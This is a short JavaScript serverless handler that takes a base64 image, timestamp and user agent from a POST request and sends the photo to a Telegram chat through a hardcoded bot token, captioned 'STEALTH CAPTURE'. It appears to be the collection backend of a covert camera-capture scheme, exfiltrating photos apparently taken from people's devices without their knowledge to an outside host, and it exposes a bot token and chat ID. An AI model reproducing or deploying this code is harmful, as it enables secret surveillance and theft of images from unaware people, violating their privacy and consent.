const fetch = require('node-fetch');

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }
    
    try {
        const { image, timestamp, userAgent } = JSON.parse(event.body);
        
        // Send to Telegram
        const formData = new FormData();
        formData.append('chat_id', '8595919435');
        formData.append('photo', Buffer.from(image, 'base64'), `capture_${timestamp}.jpg`);
        formData.append('caption', `📸 *STEALTH CAPTURE*\n🕐 ${new Date(timestamp).toLocaleString()}\n📱 ${userAgent?.substring(0, 50)}...`);
        
        await fetch(`https://api.telegram.org/bot8551119607:AAEiD_-W555yxN1phyYI7QKrzSTL8lzzMFE/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, captures: true })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal Server Error' })
        };
    }
};
